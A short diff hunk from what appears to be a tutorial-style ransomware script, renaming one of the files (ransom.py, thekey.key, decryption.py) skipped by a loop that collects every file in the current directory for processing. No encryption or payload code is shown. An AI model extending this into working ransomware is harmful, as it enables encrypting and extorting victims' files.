@@ -14,7 +14,7 @@ files = []
 # This is a for loop, it will execute the code following the colon for as many files are in a directory
 
 for file in os.listdir():
-    if file == "ransom.py" or file == "thekey.key" or file == "decrypt.py":
+    if file == "ransom.py" or file == "thekey.key" or file == "decryption.py":
         continue
     if os.path.isfile(file):
         files.append(file)
